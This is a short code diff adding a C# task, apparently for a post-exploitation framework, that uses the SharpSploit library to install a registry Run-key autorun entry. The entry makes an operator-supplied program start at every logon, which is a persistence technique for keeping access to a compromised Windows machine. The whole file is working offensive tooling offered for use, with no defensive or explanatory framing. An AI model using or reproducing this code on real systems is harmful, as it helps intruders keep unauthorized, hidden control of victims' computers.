@@ -1,0 +1,15 @@
+using System;
+  
+using SharpSploit.Persistence;
+
+public static class Task
+{
+    public static string Execute(string TargetHive, string Value, string Name)
+    {
+        if(Autorun.InstallAutorun(TargetHive, Value, Name))
+        {
+            return "Registry key: " + TargetHive + @":Software\Microsoft\Windows\CurrentVersion\Run\" + Name + " With value: " + Value + " successfully added";
+        }
+        return "Adding registry key: " + TargetHive + @":Software\Microsoft\Windows\CurrentVersion\Run\" + Name + " With value: " + Value + " failed";
+    }
+}
